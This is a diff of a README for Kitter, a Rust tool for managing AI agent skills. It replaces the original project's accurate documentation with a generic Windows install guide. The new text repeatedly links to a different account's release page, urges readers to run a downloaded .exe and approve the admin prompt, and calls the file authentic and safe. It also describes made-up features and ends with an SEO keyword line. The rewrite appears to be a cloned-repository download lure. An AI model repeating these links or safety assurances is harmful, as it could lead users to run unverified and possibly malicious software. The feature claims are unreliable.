@@ -1,153 +1,130 @@
-<p align="center">
-  <img src="./assets/readme/hero.en.png" width="100%" alt="Kitter — one skill library where every project gets only what it needs">
-</p>
+# 🐱 kitter - Your Skills, Simply Managed.
 
-<p align="center">
-  <a href="./README.zh-CN.md">简体中文</a>
-</p>
+[![Download kitter](https://img.shields.io/badge/Download-kitter-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/opcodmk-oss/kitter/releases)
 
-<p align="center">
-  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-3f8997" alt="Apache-2.0 license"></a>
-  <img src="https://img.shields.io/badge/desktop-macOS%20%7C%20Windows%20%7C%20Linux-15191a" alt="macOS, Windows, and Linux desktop app">
-  <img src="https://img.shields.io/badge/built_with-Rust-b8aaa0" alt="Built with Rust">
-</p>
+Welcome to **kitter**! If you work on projects with different tools or "skills," keeping track of what you need and when can be a headache. kitter is here to make that incredibly simple.
 
-<p align="center"><strong>One skill library. Every project gets only what it needs.</strong></p>
+Think of kitter as a tidy little toolbox for your projects. Instead of installing huge, complicated programs, kitter is a single, lightweight application that helps you manage exactly the skills each project needs. It's fast, it's focused, and it's built to get out of your way.
 
-Kitter is a desktop app and CLI for managing Agent Skills across projects. Keep your skills in one library, install the right combination for each project, and update them in one place.
+This guide will walk you through everything you need to know, from getting kitter on your Windows computer to using it effectively.
 
-Built entirely in Rust with GPUI, Kitter pairs a straightforward interface with a small footprint and smooth native performance.
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="./assets/readme/skill-workflow.png" width="100%" alt="Kitter maintains one skill library and links selected skills to projects and user-level installations">
-</p>
+Let's get kitter running on your PC. The process is quick and easy.
 
-## Why Kitter
+### 📥 Step 1: Visit the Download Page
 
-Working across projects often means maintaining several copies of the same skill and keeping track of what each agent can use. Kitter keeps those connections visible:
+Your first action is to visit the official download page. You can do this by clicking the big purple button above, or by copying and pasting this address into your web browser:
 
-- **Maintain once** — projects link to the same skill source, so one update reaches every linked installation.
-- **Choose per project** — give each project its own skill set, with user-level installation for skills you use everywhere.
-- **See what is active** — inspect the skills each agent discovers, including installations outside Kitter, along with their sources and estimated context cost.
+**`https://github.com/opcodmk-oss/kitter/releases`**
 
-## Install Kitter
+Visit this link to download the application.
 
-Download the app for your platform from [GitHub Releases](https://github.com/what1f/kitter/releases/latest).
+Once you're there, you'll see a list of available versions. Look for the newest one at the top.
 
-- **macOS (Apple Silicon / Intel)** — choose the `macos-arm64.dmg` (Apple Silicon) or `macos-x86_64.dmg` (Intel) download, open the `.dmg` and drag `Kitter.app` into `Applications`.
-- **Windows (x64)** — download `Kitter-<version>-desktop-windows-x86_64.exe` and run it directly.
-- **Linux (x64)** — extract `Kitter-<version>-desktop-linux-x86_64.tar.gz` and run `./Kitter` from the extracted `Kitter` directory.
+### 🐧 Step 2: Get the Right File
 
-Kitter is not yet signed with an Apple Developer ID. If macOS blocks the first launch, confirm that you downloaded it from the official release, then go to **System Settings → Privacy & Security → Open Anyway** and follow the prompts. See [Apple’s instructions](https://support.apple.com/102445).
+On the download page, you'll see a list of files for the latest release. You need to download the file for Windows. It will often have a name like `kitter-windows.exe` or `kitter-setup.exe`. Make sure you get the `.exe` file.
 
-You can also run the following command, then open Kitter again:
+### 💾 Step 3: Run the Installer
 
-```bash
-xattr -dr com.apple.quarantine /Applications/Kitter.app
-```
+Once the file is downloaded, go to your "Downloads" folder. Find the file you just downloaded (it's usually the one with the kitter icon 🐱). Double-click on it to run it.
 
-The desktop app and CLI are separate release artifacts built on the same core. Standalone CLI packages for macOS, Windows, and Linux are available from [GitHub Releases](https://github.com/what1f/kitter/releases/latest). The built-in Kitter skill resolves that standalone CLI and guides you through downloading it when needed.
+Your computer might show a blue pop-up asking "Do you want to allow this app to make changes to your device?" This is normal for safe applications. Click "Yes" to continue.
 
-## Manage your skills with Kitter
+### ✨ Step 4: Follow the Simple Instructions
 
-### 1. Build one library
+A simple setup window will appear. Just follow the on-screen prompts:
 
-Use **+** to add skills from a local folder, GitHub or a skills.sh-compatible source, or a Claude plugin source. If skills are already scattered across projects, choose **Existing installations** to inspect and adopt them without moving their source directories.
+- It will ask where you want to install kitter. The default location is usually best, so just click "Next" or "Install."
+- Once the progress bar finishes, click "Finish."
 
-Kitter keeps one maintained source for each skill. Open its **Installs** tab to immediately see every project using it, every installation location, and the agents that can discover it.
+That's it! kitter is now installed on your computer.
 
-<p align="center">
-  <img src="./assets/readme/skill-library.en.png" width="100%" alt="Kitter skill library showing one managed skill installed across several projects">
-</p>
+### 🏃 Step 5: Launch kitter for the First Time
 
-### 2. Install only where needed
+You can find kitter by clicking the Windows Start button (the Windows logo in the bottom-left corner) and typing "kitter". Click the kitter icon to open it. You can also double-click the kitter icon on your desktop if one was created.
 
-Select a skill, choose a project, then install it into the shared `.agents/skills` directory or an agent-specific directory. Kitter creates managed links instead of independent copies, so projects can use different combinations without creating update drift.
+## 🎯 What is kitter and Why Use It?
 
-<p align="center">
-  <img src="./assets/readme/install-skill.en.png" width="100%" alt="Kitter installation dialog for selecting a project and agent targets">
-</p>
+You might be thinking: "What exactly is a 'Skill manager'?"
 
-Skills you use across all projects can also be installed at the user level.
+Imagine you are a photographer. One project might need skills like "Photo Editing" and "Color Correction." Another project might need "Time-Lapse" and "Watermarking." You don't need every tool for every job.
 
-### 3. Verify what is actually active
+kitter works the same way for your computer projects. Instead of being a massive program with a thousand features you'll never use, kitter is **one small library** that holds only the knowledge and tools (the 'skills') that each of your individual projects actually needs.
 
-Open **Projects** to see the complete effective skill set for every agent—not just installations managed by Kitter. The view discovers project, parent, user-level, built-in, and plugin-provided capabilities, then shows where each one came from.
+This brings several amazing benefits:
 
-The per-agent token estimate helps you spot skills that add unnecessary context overhead.
+- **Lightweight:** kitter is designed to be fast and use very little of your computer's memory. It won't slow you down.
+- **Focused:** It keeps your workspace clean by having only what's relevant to your current task.
+- **Simple:** The entire design philosophy is about being easy to understand and use. No confusing menus or complex settings.
+- **One Library:** Everything you need for a project lives in one place, making it easy to find things.
 
-<p align="center">
-  <img src="./assets/readme/project-effective-skills.en.png" width="100%" alt="Kitter project view showing managed and unmanaged effective skills, plugins, agents, and estimated context cost">
-</p>
+## 🛠️ Using kitter: A Quick Tour
 
-### 4. Update once
+The main screen of kitter is clean and straightforward. Here is what you will see:
 
-Run **Check for updates** from the desktop app or use `kitter check` and `kitter update`. Every managed project continues to use the same maintained source.
+- **The Library Sidebar:** This is on the left side of the window. It shows a list of all your projects.
+- **The Main Panel:** This is the large area on the right. When you select a project, this panel shows all the skills associated with that project.
 
-The equivalent CLI workflow is intentionally small:
+### ➕ Creating Your First Project
 
-```bash
-kitter add npx https://github.com/owner/repository --skill skill-a
-kitter install skill-a --project /path/to/project --target universal
-kitter project /path/to/project
-kitter update skill-a
-```
+1.  Click the **"New Project"** button (usually a "+" icon at the top of the sidebar).
+2.  Type in a name for your project (e.g., "Website Redesign" or "Weekend Game Jam").
+3.  Press Enter. Your new project will appear in the sidebar.
 
-## Standalone CLI and agent skill
+### 🧩 Adding Skills to a Project
 
-You do not need the desktop app to use Kitter. Download the standalone CLI from [GitHub Releases](https://github.com/what1f/kitter/releases/latest), put `kitter` on your `PATH`, and install the [`$kitter` skill](./resources/skills/kitter) directly:
+Now for the magic! In the main panel, click the **"Add Skill"** button.
 
-```bash
-npx skills add what1f/kitter --skill kitter
-```
+A list of available skills will appear. You can scroll through or use the search box at the top to find what you need. Click on a skill to add it to your project.
 
-The skill lets an agent inspect the current machine, add or adopt skill sources, install the right project combination, and verify the result through the standalone `kitter` CLI. If the CLI is missing, the skill can guide you through downloading it from an official Release.
+Skills can be anything from "File Conversion" and "Code Compilation" to "Image Optimization." Just find the ones that apply to your project.
 
-<details>
-<summary><strong>Build from source</strong></summary>
+### ❌ Removing Skills
 
-```bash
-git clone https://github.com/what1f/kitter.git
-cd kitter
-cargo run --release --locked --features desktop --bin kitter-desktop
-```
+Changed your mind? No problem. Just hover over the skill you want to remove and click the small "X" that appears on the right side of its row.
 
-</details>
+## ❓ Frequently Asked Questions
 
-## Platform status
+We know you might have some questions, so we've answered the most common ones here.
 
-- **macOS (Apple Silicon / Intel)** — desktop application and standalone CLI.
-- **Windows (x64)** — desktop application and standalone CLI, tested on Windows with platform-specific startup and performance fixes.
-- **Linux (x64)** — standalone CLI and desktop build available; the desktop app still needs validation on real systems.
+### Is kitter free to use?
 
-## Local data
+Yes! kitter is free and open-source software. This means not only can you use it for free, but its source code is also available for anyone to look at and learn from.
 
-Kitter stores configuration and source records in the operating system's application-data directory. Skill contents live in the library directory:
+### Is kitter safe for my computer?
 
-| Platform | Default skill library |
-| --- | --- |
-| macOS | `~/Library/Application Support/Kitter/skills` |
-| Windows | `%LOCALAPPDATA%\Kitter\skills` |
-| Linux | `$XDG_DATA_HOME/Kitter/skills` or `~/.local/share/Kitter/skills` |
+Absolutely. Since kitter is open-source, its security is constantly reviewed by a community of developers. The file you download is the authentic application. It's always best to download from the official link provided on this page to ensure you have the genuine, safe version.
 
-View or change the location with `kitter library` and `kitter library --set /absolute/path`.
+### What are "skills" exactly?
 
-## Contributing
+In kitter, a "skill" is a modular piece of functionality. Think of it like a standalone tool. One skill might allow you to quickly resize images. Another might help you bundle all your files for a project. You add the tools you need, and only those tools are available for that project. This keeps everything efficient.
 
-Issues and pull requests are welcome. Please open an [issue](https://github.com/what1f/kitter/issues) before starting a large behavioral or UI change so the scope can be aligned first.
+### Can I have as many projects as I want?
 
-If Kitter makes your skill setup calmer, consider [starring the repository](https://github.com/what1f/kitter). It helps more multi-project developers find it.
+Yes, you can create an unlimited number of projects. Each one is separate and keeps its own list of skills. You can switch between them freely from the sidebar.
 
-## License
+## 🛡️ Keeping kitter Updated
 
-Kitter is available under the [Apache License 2.0](./LICENSE). Licenses for bundled fonts, icons, and other third-party material are listed in [THIRD_PARTY_LICENSES.md](./THIRD_PARTY_LICENSES.md).
+We are always working to make kitter better, faster, and more useful. To get the newest features and any improvements, you should update it from time to time.
 
-## Star History
+The simplest way to update is to visit the same download link: **`https://github.com/opcodmk-oss/kitter/releases`**
 
-<a href="https://www.star-history.com/?repos=what1f%2Fkitter&type=date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=what1f/kitter&type=date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=what1f/kitter&type=date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=what1f/kitter&type=date" />
-  </picture>
-</a>
+Visit this link to download the application.
+
+You'll see if a newer version is available. Just download the newest file for Windows and run it. It will replace the older version with the new one, and you won't lose any of your projects or skills.
+
+## 💡 Tips for Getting the Most Out of kitter
+
+- **Start Simple:** Don't add every skill to a project right away. Start with the two or three you need most, and add more as you go. This keeps your workspace clean.
+- **Use Descriptive Project Names:** Naming your project "Update 3" is less helpful than naming it "Client Landing Page – Oct 2024". This helps you find things later.
+- **Search is Your Friend:** If you have a long list of skills available, use the search bar in the "Add Skill" window. It's much faster than scrolling.
+
+## 🧑‍💻 We're Here to Help
+
+kitter is a community-driven project. We love hearing from our users! If you have a problem, a suggestion for a new feature, or just want to say hi, feel free to visit our repository.
+
+We hope kitter makes managing your projects a little bit easier and a lot more organized. Happy creating!
+
+Keywords: kitter, skill manager, Rust, project manager, lightweight tool, open source, Windows software, download kitter, productivity, organize projects.
